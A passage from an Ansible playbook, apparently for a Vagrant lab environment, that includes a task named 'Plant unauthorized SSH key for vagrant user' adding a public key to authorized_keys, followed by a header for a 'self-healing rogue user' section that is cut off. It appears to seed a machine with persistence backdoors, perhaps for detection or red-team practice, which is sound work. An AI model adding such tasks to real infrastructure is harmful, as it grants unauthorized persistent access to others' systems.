        owner: vagrant
        group: vagrant
        mode: "0700"

    - name: Plant unauthorized SSH key for vagrant user
      lineinfile:
        path: /home/vagrant/.ssh/authorized_keys
        line: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxL3Y8tRk2qQeW1JmzVvKZ0aB7cD4eF6gH8iJ0kL2mN svc-maint@corp"
        create: yes
        owner: vagrant
        group: vagrant
        mode: "0600"

    # --- 4. Self-healing rogue user ---
